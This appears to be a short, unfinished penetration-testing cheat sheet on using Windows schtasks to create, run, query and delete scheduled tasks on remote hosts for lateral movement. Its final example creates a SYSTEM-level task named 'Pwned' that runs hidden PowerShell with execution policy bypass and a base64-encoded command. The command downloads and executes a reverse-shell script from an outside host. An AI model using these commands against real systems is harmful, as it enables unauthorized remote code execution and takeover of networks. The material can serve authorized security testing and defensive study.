
>[!IMPORTANT]
> This note is a work-in-progress.


```powershell
# Create Remote Task
schtasks /create /S <remote_host> /SC once /ST 12:00 /RU SYSTEM /TN <task_name> /TR <command_to_run>

# /S <string>  --> Target host to run
# /RU <string> --> User to run as (current user doesn't require password)
# /RP <string> --> Password for the specified user
# /ST <string> --> Start time
# /SD <string> --> Start date

# Manually Execute Remote Task
schtasks /run /S <remote_host> /TN <task_name>

# Manually Delete Remote Task
schtasks /delete /S <remote_host> /TN <task_name>

# Query Remote task
schtasks /query /S <remote_host> /TN <task_name> /FO list /V

# Example: Lateral Movement via RevShell Stager
schtasks /create /S host.example.com /SC once /ST 12:00 /RU SYSTEM /TN Pwned /TR "powershell -nop -ex bypass -wi h -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADEAMAAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA="
```